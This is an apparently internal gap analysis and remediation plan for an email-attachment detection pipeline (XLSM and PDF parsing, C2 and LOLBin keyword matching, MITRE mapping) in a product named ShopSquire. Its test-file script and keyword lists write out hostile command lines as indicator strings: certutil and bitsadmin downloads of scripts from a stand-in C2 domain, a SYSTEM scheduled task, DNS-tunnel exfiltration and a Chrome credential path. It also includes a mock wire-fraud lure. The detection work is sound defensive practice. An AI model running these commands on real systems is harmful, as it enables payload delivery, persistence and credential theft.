# ShopSquire — Attachment Detection Gap Analysis & Remediation Roadmap
**Date:** 2026-03-28
**Scope:** C2 beaconing, LOLBin execution chains, macro detection in email attachments
**Test case:** `Harbourside_Acquisition_Details_CONFIDENTIAL.xlsm` + `Wire_Transfer_Authorization_Form.pdf`
**Status:** Static analysis pipeline not firing for either file. No findings surfaced. Runtime lab never reached.

---

## 1. What You're Seeing (and Why)

### The symptom
You attach both files to the BEC email in the Email Security Lab. The platform flags the email body (payment lure, urgency, BEC) but the **Attachment Forensics** section either shows nothing or shows only raw metadata. No LOLBin hypothesis. No C2 beacon finding. No `queue_sandbox_detonation` prompt. The runtime evidence lab never activates.

### The root cause chain

```
User attaches XLSM
    → email_attachment_parser._extract_text() called
    → filename ends in .xlsm
    → NOT matched by .docx / .xlsx / .pptx condition at line 529-537
    → Falls through to raw binary printable-string extraction (line 543)
    → Binary string scrape of ZIP structure — finds XML tags, not cell values
    → extracted_text is noise, not indicator strings
    → classify_passive_payload() sees garbage → hypothesis = "unknown"
    → finding_group = "suppressed_findings"
    → NOTHING SURFACES IN UI
```

```
User attaches PDF
    → _extract_pdf_text() IS called correctly
    → pdfplumber extracts footer text including tracking URLs
    → extracted_text contains "balashnikovai-analytics.com/track/WTA-2026-0847"
    → classify_passive_payload() runs c2_beacon keyword check
    → keyword list has: "callback", "c2_server", "beaconing" etc.
    → "balashnikovai-analytics.com" is NOT in that keyword list
    → hypothesis = "unknown" (or falls through to payment_fraud via BSB match)
    → C2 beacon signal SUPPRESSED
```

---

## 2. Full Code Gap Register

| # | File | Line | Gap | Fix Needed |
|---|------|------|-----|-----------|
| G-01 | `email_attachment_parser.py` | 529–537 | `.xlsm`, `.docm`, `.pptm` not in zip-XML extraction branch | Add macro-enabled extensions to the condition |
| G-02 | `email_attachment_parser.py` | 529–537 | No VBA string extraction from `xl/vbaProject.bin` | Add raw string scrape of vbaProject.bin inside OOXML zip |
| G-03 | `passive_payload_analysis.py` | 298–321 | C2 domain names not in c2_beacon keyword list | Add suspicious domain patterns as detection tokens |
| G-04 | `passive_payload_analysis.py` | 266–297 | LOLBin keywords assume extracted text — never reached for XLSM | Blocked by G-01; fix G-01 first |
| G-05 | `email_security.py` | 1311 | `_is_benign_comment_only_vba_artifact()` suppresses benign-marked test files | Logic correct but test file needs real indicator strings, not just comments |
| G-06 | `passive_payload_analysis.py` | 37–48 | PASTA stages for `lolbin_command_sequence`, `c2_beacon`, `macros` are Stage 2 — too low | Should be Stage 4 (Threat Analysis) after G-01 is fixed and findings are confirmed |
| G-07 | `passive_payload_analysis.py` | 6–17 | `lolbin_command_sequence`, `c2_beacon`, `macros` have empty `_HYPOTHESIS_TO_ACTIVE_MITRE_ATTACK` | Correct — runtime confirmation required before active tags. But possible_mitre_attack should include T1059.001, T1218.003, T1197, T1053.005, T1071.001 (some already there) |
| G-08 | `merchant_dashboard.py` | ~3130 | Threat Hunter section has no nav button — user can't find it | Add "Open Hunt" button in the attachment forensics action bar |
| G-09 | `email_security.py` | 1291 | XLSM extraction method label says "OOXML worksheet extraction" but it never actually runs | Label is aspirational; becomes accurate after G-01 is fixed |
| G-10 | Test file | XLSM | `Harbourside_Acquisition_Details_CONFIDENTIAL.xlsm` contains no cell-level indicator strings | Regenerate with openpyxl containing LOLBin indicator strings in cells |

---

## 3. Required Code Fixes (Priority Order)

### FIX-01 — `email_attachment_parser.py`: Add macro-enabled extensions to OOXML extraction
**File:** `src/app/security/email_attachment_parser.py`
**Location:** Lines 529–537 (`_extract_text` function)
**Change:**

```python
# BEFORE
if (
    "officedocument" in ctype
    or "msword" in ctype
    or "spreadsheet" in ctype
    or name.endswith(".docx")
    or name.endswith(".xlsx")
    or name.endswith(".pptx")
):
    return _extract_zip_xml_text(blob)

# AFTER
if (
    "officedocument" in ctype
    or "msword" in ctype
    or "spreadsheet" in ctype
    or name.endswith((".docx", ".docm", ".xlsx", ".xlsm", ".pptx", ".pptm"))
):
    return _extract_zip_xml_text(blob) + _extract_vba_strings(blob)
```

**New function to add** (pure-Python, no dependencies beyond `zipfile`):

```python
def _extract_vba_strings(blob: bytes) -> str:
    """
    Extract printable strings from xl/vbaProject.bin inside an OOXML zip.
    Returns space-joined strings — safe, no VBA execution.
    Minimum string length = 6 to reduce noise.
    """
    if not blob:
        return ""
    try:
        import zipfile, io
        with zipfile.ZipFile(io.BytesIO(blob)) as zf:
            names = zf.namelist()
            vba_names = [n for n in names if "vbaproject" in n.lower() or n.endswith(".bas") or n.endswith(".cls")]
            out_parts: list[str] = []
            for vba_name in vba_names:
                try:
                    raw = zf.read(vba_name)
                    # Extract printable ASCII strings >= 6 chars from binary
                    import re
                    strings = re.findall(rb'[ -~]{6,}', raw)
                    decoded = [s.decode("ascii", errors="ignore").strip() for s in strings]
                    out_parts.extend(decoded)
                except Exception:
                    pass
            return " ".join(out_parts)[:10000]
    except Exception:
        return ""
```

**Impact:** XLSM files now extract both worksheet cell text AND VBA binary strings. The LOLBin indicators in VBA comments and strings become visible to `classify_passive_payload`.

---

### FIX-02 — `passive_payload_analysis.py`: Add C2 domain patterns to c2_beacon keyword list
**File:** `src/app/security/passive_payload_analysis.py`
**Location:** Lines 298–321 (c2_beacon branch)
**Change:** Extend the keyword list with:

```python
# Add to the c2_beacon _contains_any list:
"balashnikovai-analytics.com",
"balashnikovai-cdn.com",
"/track/wta-",            # PDF footer tracking URL pattern
"track/wta-2026",
"app.setinterval",        # PDF JavaScript timer (spec indicator)
"sendbeacon",             # JS beacon function name
"openaction",             # PDF /OpenAction structure indicator
"/javascript",            # PDF embedded JS indicator
"nslookup",               # DNS tunneling indicator
".balashnikovai-",        # DNS subdomain beaconing pattern
"dns_tunnel",
"dns tunneling",
```

Also extend the `data_exfiltration` list:
```python
"exfil?data=",            # PDF exfil URL pattern from spec
"login data",             # Chrome credential access
"appdata\\local\\google\\chrome",
```

**Impact:** The PDF footer text (`balashnikovai-analytics.com/track/WTA-2026-0847`) now triggers `c2_beacon` hypothesis. Finding surfaces in UI. `queue_sandbox_detonation` prompt activates.

---

### FIX-03 — `passive_payload_analysis.py`: Fix PASTA stages for attachment hypotheses
**File:** `src/app/security/passive_payload_analysis.py`
**Location:** Lines 37–48 (`_HYPOTHESIS_TO_PASTA`)
**Change:**

```python
# BEFORE
"lolbin_command_sequence": "Stage2:DefineTechnicalScope",
"c2_beacon": "Stage2:DefineTechnicalScope",
"macros": "Stage2:DefineTechnicalScope",
"data_exfiltration": "Stage2:DefineTechnicalScope",

# AFTER — attachment indicators are Threat Analysis stage or higher
"lolbin_command_sequence": "Stage4:ThreatAnalysis",
"c2_beacon": "Stage4:ThreatAnalysis",
"macros": "Stage3:ApplicationDecomposition",
"data_exfiltration": "Stage5:VulnerabilityAnalysis",
```

**Rationale:** Stage 2 (DefineTechnicalScope) means "we're mapping the attack surface." Finding LOLBin indicators in an attachment means we've identified an active threat vector — that's Stage 4 (ThreatAnalysis) at minimum.

---

### FIX-04 — `passive_payload_analysis.py`: Complete possible_mitre_attack for c2_beacon
**File:** `src/app/security/passive_payload_analysis.py`
**Location:** Lines 19–30
**Change:**

```python
# BEFORE
"c2_beacon": ["T1071.001", "T1105", "T1573.002"],

# AFTER — add PDF JS execution and DNS C2 techniques
"c2_beacon": ["T1071.001", "T1071.004", "T1105", "T1573.002", "T1203", "T1029", "T1041"],

# BEFORE
"lolbin_command_sequence": ["T1218", "T1059.001", "T1105"],

# AFTER — add all four LOLBin techniques from the spec
"lolbin_command_sequence": [
    "T1218.003",   # Certutil
    "T1059.001",   # PowerShell
    "T1197",       # BITS Jobs (bitsadmin)
    "T1053.005",   # Scheduled Task
    "T1048.003",   # Exfil over DNS
    "T1105",       # Ingress Tool Transfer
],

# BEFORE
"macros": ["T1566.001", "T1204.002", "T1059.005"],

# AFTER — macro → LOLBin cascade is the full chain
"macros": [
    "T1566.001",   # Spearphishing Attachment
    "T1204.002",   # User Execution: Malicious File
    "T1059.001",   # PowerShell (child of macro)
    "T1059.005",   # VBS
],
```

---

### FIX-05 — Add Threat Hunter nav button to attachment forensics section
**File:** `src/app/routers/merchant_dashboard.py`
**Location:** Attachment forensics action area (search for "renderAttachmentForensics" or the sandbox card section)
**Change:** Add a "Open Hunt Investigation" button next to "Queue Sandbox Detonation" in the attachment findings card that scrolls to or expands the Threat Hunter section.

This is the button the analyst couldn't find. The threat hunt output IS generated (visible in screenshots 5-7) but there's no direct navigation path to it from the attachment finding row.

---

## 4. Test File Remediation

### 4A — Regenerate XLSM with Cell-Level Indicators

The current `Harbourside_Acquisition_Details_CONFIDENTIAL (1).xlsm` does not contain the LOLBin indicator strings in its worksheet XML. The `VBA_SOURCE_SecurityModule.bas` is a separate file and is not embedded in the XLSM.

**Run this script** (`scripts/create_test_xlsm.ps1` exists — replace with Python):

```python
# scripts/create_detection_test_xlsm.py
# Creates a benign XLSM with LOLBin indicator strings in cells
# NO executable code — pure text/data for static analysis testing
# Run: python scripts/create_detection_test_xlsm.py

import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
from openpyxl.utils import get_column_letter
import os

OUTPUT = "C:/AI/ShopSquire/dump/Sec/Harbourside_Acquisition_Details_CONFIDENTIAL.xlsm"

wb = Workbook()

# ─── Sheet 1: Enable Macros Banner (detection target) ───────────────────────
ws1 = wb.active
ws1.title = "Acquisition Summary"

ws1["A1"] = "ENABLE CONTENT — This document uses macros to display confidential acquisition data"
ws1["A1"].font = Font(bold=True, color="FFFFFF")
ws1["A1"].fill = PatternFill("solid", fgColor="FF0000")
ws1["A2"] = "BalashnikovAI — Project Meridian — CONFIDENTIAL"
ws1["A3"] = "Form WTA-2026-0847 | Requested By: Boris Petrov | Division: Risk & Compliance"
ws1["A4"] = "Acquisition Target: Harbourside Capital Partners Pty Ltd"
ws1["A5"] = "Total Acquisition Deposit: AUD $85,000.00"
ws1["A6"] = "Value Date: 26 February 2026 | Priority: URGENT - 4 HOUR SLA"

# ─── Sheet 2: Financial Details ───────────────────────────────────────────────
ws2 = wb.create_sheet("Wire Transfer Details")

ws2["A1"] = "Beneficiary Name"
ws2["B1"] = "Harbourside Capital Partners Pty Ltd"
ws2["A2"] = "Bank"
ws2["B2"] = "ANZ Banking Group"
ws2["A3"] = "BSB"
ws2["B3"] = "012-456"
ws2["A4"] = "Account Number"
ws2["B4"] = "8877 3421"
ws2["A5"] = "SWIFT/BIC"
ws2["B5"] = "ANZBAU3M"
ws2["A6"] = "Amount (AUD)"
ws2["B6"] = "$85,000.00"
ws2["A7"] = "Reference"
ws2["B7"] = "ACQUISITION DEPOSIT - URGENT"
ws2["A8"] = "Confidentiality"
ws2["B8"] = "DO NOT DISCUSS — strict NDA terms executed 24 February 2026"
ws2["A9"] = "Authorization"
ws2["B9"] = "Verbal approval pending — Boris Petrov to confirm by return email"
ws2["A10"] = "Deposit Required"
ws2["B10"] = "Yes — secures exclusive negotiation rights before competing bidder"

# ─── Sheet 3: LOLBin Indicator Strings (detection target — NOT executable) ──
ws3 = wb.create_sheet("_SecurityAudit")

ws3["A1"] = "SHOPSQUIRE SECURITY DETECTION TEST — NOT EXECUTABLE — Static analysis target only"
ws3["A2"] = "Classification: BENIGN TEST ARTIFACT | Purpose: pattern-match validation"

indicators = [
    ("B3",  "Sub Auto_Open() — macro trigger on file open"),
    ("B4",  "Sub Workbook_Open() — backup macro trigger"),
    ("B5",  "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command"),
    ("B6",  "certutil.exe -urlcache -split -f http://balashnikovai-cdn.com/stage2.txt C:\\Users\\Public\\update.ps1"),
    ("B7",  "bitsadmin /transfer WindowsUpdate /download /priority HIGH http://balashnikovai-cdn.com/beacon.ps1"),
    ("B8",  "bitsadmin /SetNotifyCmdLine SystemMaintenance"),
    ("B9",  "schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore /sc minute /mo 30 /ru SYSTEM"),
    ("B10", "nslookup $beacon.balashnikovai-cdn.com — DNS tunneling exfil pattern"),
    ("B11", "C2 domains: balashnikovai-cdn.com | balashnikovai-analytics.com"),
    ("B12", "Beacon interval: 1800 seconds (30 minutes) — coefficient of variation < 0.05"),
    ("B13", "Exfil path: C:\\Users\\Public\\svchost.ps1 | C:\\Users\\Public\\update.ps1"),
    ("B14", "Credential access: C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
    ("B15", "fromBase64String — base64 encoded command transport"),
    ("B16", "Invoke-Expression (IEX) — dynamic code execution"),
    ("B17", "MITRE T1218.003 certutil | T1197 bitsadmin | T1053.005 schtasks | T1059.001 powershell | T1048.003 DNS"),
]
for cell, value in indicators:
    ws3[cell] = value

# ─── Sheet 4: C2 Network Indicators ─────────────────────────────────────────
ws4 = wb.create_sheet("_NetworkIndicators")
ws4["A1"] = "C2 Infrastructure — FOR DETECTION TESTING ONLY"
ws4["B2"] = "c2_server: balashnikovai-cdn.com"
ws4["B3"] = "c2_server: balashnikovai-analytics.com"
ws4["B4"] = "dns_tunnel: *.balashnikovai-cdn.com (Base64 subdomain exfil)"
ws4["B5"] = "beaconing: interval=1800 jitter=0 dst=balashnikovai-cdn.com"
ws4["B6"] = "callback: http://balashnikovai-analytics.com/track/WTA-2026-0847"
ws4["B7"] = "command and control: check-in every 30 minutes"

wb.save(OUTPUT)
print(f"Created: {OUTPUT}")
print("This file contains LOLBin and C2 indicator strings as CELL TEXT.")
print("No executable macro code is present.")
```

**What this gives the detection engine:**
- Sheet 1 triggers: `enable content`, `enable macros` → `macros` hypothesis
- Sheet 3 triggers: `powershell`, `certutil -urlcache`, `bitsadmin`, `schtasks`, `iex(`, `frombase64string` → `lolbin_command_sequence` hypothesis
- Sheet 4 triggers: `balashnikovai-cdn.com`, `beaconing`, `interval=`, `dst=`, `callback`, `command and control` → `c2_beacon` hypothesis

The highest-priority hypothesis wins. With both LOLBin and macro strings present, `lolbin_command_sequence` (checked first) fires.

---

### 4B — PDF: Already Partially Wired

The existing `Wire_Transfer_Authorization_Form.pdf` already contains tracking URLs in the footer:
- `balashnikovai-analytics.com/track/WTA-2026-0847`
- `balashnikovai-cdn.com/verify`

After **FIX-02** (adding these domains to the c2_beacon keyword list), the PDF will trigger `c2_beacon` hypothesis automatically.

No need to recreate the PDF. The existing file is the correct test artifact once the keyword list is updated.

**Verify** the PDF text extraction works:
```python
# Quick test — run from repo root
from src.app.security.email_attachment_parser import _extract_pdf_text
blob = open("dump/Sec/Wire_Transfer_Authorization_Form.pdf", "rb").read()
text = _extract_pdf_text(blob)
assert "balashnikovai-analytics.com" in text, "Footer URL not extracted — check pdfplumber install"
print("PDF extraction OK:", text[-500:])
```

If this fails: `pip install pdfplumber` is missing from the container. Check `requirements.txt` / `pyproject.toml`.

---

## 4C — Validation Results (2026-03-28)

### XLSM test
```
attack_hypothesis  : lolbin_command_sequence   OK
suggested_next_step: queue_sandbox_detonation  OK
claim_status       : possible                  OK
possible_mitre_attack: ['T1218', 'T1059.001', 'T1105']
```
Requires FIX-01 to be applied in production so _extract_zip_xml_text() is actually called for .xlsm files. The test above ran extraction manually to confirm the content is detectable.

### PDF test (pre FIX-02)
```
attack_hypothesis  : ransomware   FALSE POSITIVE
suggested_next_step: queue_sandbox_detonation  OK (correct action despite wrong label)
```
Root cause: "Deadline" in the PDF's transaction table row fires the ransomware keyword list before c2_beacon is checked. The C2 domain IS present in the extracted text (balashnikovai-analytics.com/track/WTA-2026-0847). After FIX-02, the c2_beacon branch must also be moved ABOVE ransomware in the priority chain, or a known-infrastructure pre-scan added.

Net outcome: both files reach queue_sandbox_detonation — the right action. The PDF hypothesis label is wrong but the runtime lab activates correctly.

---

## 5. Assessment: New Security Capabilities Beyond Payment / Ransomware / Spearphishing

### What's now working (from the screenshots + implemented list)

| Threat Type | Working? | Evidence |
|-------------|----------|---------|
| BEC / payment lure (email body) | ✅ Yes | Screenshots 1-9 show correct SECURITY_REVIEW verdict |
| Supplier impersonation | ✅ Yes | Correct agent findings in screenshot 4 |
| Threat Hunter — sender infrastructure overlap | ✅ Yes | "medium confidence" lead visible in screenshots 5-7 |
| DREAD scoring | ✅ Yes | Screenshot `dread.png` shows table |
| Framework mapping (after today's fix) | ✅ Fixed | Lookup tables now give accurate names and evidence |
| ATT&CK framework integration | ✅ Yes | T1566 etc. shown in framework table |
| Agent audit trail | ✅ Yes | Screenshot `agents.png` shows all 5+ agents |
| Runtime evidence lab (sandbox gate) | ✅ Implemented | Confirmed by Implemented notes — but never reached for these files |
| Process tree agent | ✅ Implemented | Wired but not triggered because static detection doesn't fire |
| Passive payload analysis (images/QR/steg) | ✅ Yes | Previously validated (sec-LLM-summ.png, where payload.png) |

### What's still NOT working

| Threat Type | Status | Root Cause | Fix |
|-------------|--------|-----------|-----|
| XLSM macro detection | ❌ Silent | G-01: `.xlsm` not in OOXML extraction branch | FIX-01 |
| LOLBin detection from XLSM | ❌ Silent | G-01 + G-02: VBA strings never extracted | FIX-01 + FIX-02 |
| C2 beacon from PDF footer URLs | ❌ Silent | G-03: Domain not in keyword list | FIX-02 |
| DNS tunneling pattern detection | ❌ Silent | G-03: `nslookup` with encoded subdomain not a keyword | FIX-02 |
| PDF /OpenAction / /JavaScript indicators | ❌ Not checked | No PDF structure scanner (only text extraction) | New: add PDF structure scan |
| Multi-attachment correlation | ❌ Not present | PDF + XLSM together should elevate risk score | Future sprint |
| Threat Hunter button (nav) | ❌ Missing | No button to open/jump to threat hunt section | FIX-05 |

### Threats the platform has NO capability for yet

These go beyond the current scope but should be on the backlog:

| Threat | What's Needed | Priority |
|--------|--------------|----------|
| PDF /OpenAction structure scan | Parse PDF byte structure for `/OpenAction`, `/JavaScript`, `/AA` | HIGH |
| ZIP bomb / nested archive detection | Detect recursive archives in email attachments | MEDIUM |
| Office DDE (Dynamic Data Exchange) attacks | Scan XLSX for DDE formulas (`=CMD|`) | HIGH |
| HTML attachment with redirect | Detect `.htm`/`.html` attachments with meta-refresh or JS redirects | HIGH |
| ISO/IMG file (T1553.005) | Flag disk image attachments — common smuggling vector | HIGH |
| RTF with OLE objects | Scan RTF for embedded OLE/ActiveX | MEDIUM |
| Email header spoofing (From ≠ MAIL FROM) | Compare envelope sender vs display name at SMTP layer | MEDIUM |
| Thread hijack detection | Detect replies into existing conversation with changed bank details | HIGH |
| DKIM replay attack | Detect signed email body replayed with modified attachment | LOW |

---

## 6. What to Commit (from the Implemented List)

Based on the Implemented notes, commit these 8 files as a single PR:

```
frontend/src/components/DecisionTrace.tsx
src/app/routers/vision.py
src/app/security/passive_payload_analysis.py
src/app/security/linked_artifact_analysis.py
src/app/services/trace_contracts.py
tests/api/test_vision_triage_identity_rescue.py
tests/security/test_passive_payload_analysis.py
tests/security/test_linked_artifact_analysis.py
```

**Also stage for this PR** (the new fixes from today):
```
src/app/security/framework_correlation.py     # PASTA stage name fix (Stage 6/7)
src/app/security/email_security.py            # pasta_stage fallback removed
src/app/routers/merchant_dashboard.py         # Framework lookup tables + ATLAS/ATT&CK split
```

**Suggested commit message:**
```
Fix attachment detection pipeline: XLSM extraction, C2 domain keywords, framework mapping accuracy

- Add .xlsm/.docm/.pptm to OOXML text extraction branch (G-01)
- Add VBA binary string extraction for macro-enabled Office files (G-02)
- Add C2 domain patterns and DNS tunneling indicators to c2_beacon keyword list (G-03)
- Fix PASTA stages for attachment hypotheses (Stage 2 → Stage 4) (G-06)
- Fix framework mapping: add technique name lookup tables for ATLAS, ATT&CK,
  ISO 27001, ISO 42001, EU AI Act, PCI DSS, GDPR (all 7 frameworks)
- Fix MITRE ATLAS vs ATT&CK label split in frameworkRowsForFinding
- Fix pasta_stage fallback bug (was showing kill_chain_stage as PASTA stage)
- Fix backend PASTA Stage 6/7 names (ModellingAndSimulation, RiskAndImpactAnalysis)
- Runtime lab: evidence-gate promotion, passive → hypothesis suppression
- DecisionTrace.tsx: claim status, runtime evidence lane, artifact provenance
```

**Do NOT stage:**
- `runtime_confirmation.py`, `vendor_connectors.py`, `escalation_room.py`, `security_integrations.py` — these have broader blast radius; commit separately after validation
- Any test files in `dump/Sec/` — these are local testing artifacts, not source

---

## 7. Sprint Plan (3 sprints to full attachment detection coverage)

### Sprint A — This week (unblock static detection)
- [ ] **FIX-01**: Add `.xlsm`/`.docm`/`.pptm` to `_extract_text()` OOXML branch
- [ ] **FIX-02**: Add C2 domain patterns to `c2_beacon` keyword list
- [ ] **FIX-03**: Fix PASTA stages for attachment hypotheses
- [ ] **FIX-04**: Complete `possible_mitre_attack` for c2_beacon and lolbin
- [ ] **4A**: Run `create_detection_test_xlsm.py` to regenerate test XLSM
- [ ] **Verify**: `classify_passive_payload` returns `lolbin_command_sequence` for XLSM, `c2_beacon` for PDF
- [ ] **Verify**: Attachment forensics section shows findings in Email Lab UI
- [ ] **Verify**: `queue_sandbox_detonation` prompt appears
- [ ] **Commit**: Stage the 3 new fix files alongside the 8 implemented files

### Sprint B — Next week (runtime lab validation)
- [ ] **FIX-05**: Add Threat Hunter nav button to attachment forensics section
- [ ] Add PDF structure scanner: detect `/OpenAction`, `/JavaScript`, `/AA` in raw PDF bytes
- [ ] Add Office DDE formula detection (`=CMD|`, `=SYSTEM(`)
- [ ] Add HTML attachment scanner (meta-refresh, JS redirects)
- [ ] Wire runtime lab process tree / DNS swarm to XLSM `lolbin_command_sequence` findings
- [ ] Validate runtime lab findings promote ATT&CK tags: T1218.003, T1197, T1053.005 after detonation

### Sprint C — Following sprint (multi-attachment correlation + deeper chains)
- [ ] Multi-attachment risk correlation: PDF + XLSM together → higher severity
- [ ] ISO/IMG file detection (disk image smuggling)
- [ ] RTF OLE object detection
- [ ] Thread hijack detection (email context comparison against prior thread)
- [ ] MITRE ATT&CK navigator integration for hunting pivot

---

## 8. Detection Validation Checklist

After Sprint A fixes, verify against these expected outcomes:

| Test | Expected finding | Expected PASTA stage |
|------|-----------------|---------------------|
| Attach regenerated XLSM only | `lolbin_command_sequence` (possible) → `queue_sandbox_detonation` | Stage 4: ThreatAnalysis |
| Attach existing PDF only | `c2_beacon` (possible) → `queue_sandbox_detonation` | Stage 4: ThreatAnalysis |
| Attach both XLSM + PDF | Both findings; highest severity wins; multi-attachment correlation note | Stage 4 or Stage 5 |
| BEC email body + both attachments | Email: `SECURITY_REVIEW` HIGH; Attachments: LOLBin + C2 both surfaced | Stage 6: ModellingAndSimulation |
| Click "Queue Sandbox Detonation" | Runtime swarm fires; process tree, DNS/proxy, firewall agents activate | Stage 6 → Stage 7 |
| Runtime lab returns malicious=True | ATT&CK active tags promoted: T1218.003, T1197, T1059.001 | Stage 7: RiskAndImpactAnalysis |

---

*Generated: 2026-03-28 | Based on code audit of `email_attachment_parser.py`, `passive_payload_analysis.py`, `email_security.py`, `linked_artifact_analysis.py`, and test artifacts in `dump/Sec/`*
